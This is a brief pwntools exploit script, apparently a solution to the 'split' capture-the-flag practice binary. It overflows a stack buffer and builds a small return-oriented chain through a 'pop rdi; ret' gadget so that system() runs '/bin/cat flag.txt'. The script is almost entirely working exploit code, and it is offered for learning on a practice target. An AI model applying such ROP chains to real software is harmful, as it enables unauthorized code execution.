"""
64bit
rbp-0x20 <= buffer[20]

"""

from pwn import *
context.log_level = 'debug'
elf = ELF("./split")
p = process("./split")
#p = remote("localhost", 7777 )

payload = b''
payload += b'A'*0x20
payload += b'BBBBBBBB'
payload += p64( 0x400883 + 1 )
payload += p64( 0x400883 ) #pop rdi; ret
payload += p64( next( elf.search(b"/bin/cat flag.txt")) )
payload += p64( elf.plt["system"] )

p.recvuntil("> ")
p.sendline( payload )
print( p.recv() )
